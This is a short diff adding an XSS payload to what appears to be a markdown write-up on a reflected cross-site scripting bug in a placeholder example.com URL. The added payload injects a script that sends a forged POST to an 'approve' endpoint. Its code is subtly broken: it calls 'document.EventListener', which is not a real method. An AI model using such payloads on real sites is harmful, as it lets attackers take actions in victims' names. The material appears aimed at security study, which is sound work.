@@ -340,6 +340,9 @@ Vulnerable URL - https://example.com/%22-alert(1)-%22
 
 Working POC - "-alert(1)-"
 
+Working Paload (text content-type) : `https://example.com/"-document.EventListener('DOMContentLoaded', function() {document.body.appendChild(Object.assign(document.createElement('script'), { textContent: "fetch('https://example.com/approve',{method:'POST',body:'user=test&action=approve'}).then(console.log())"}))})-"`
+
+Below is the process of payload creation
 
 > you can append html tag using javascript, below are example payloads
 
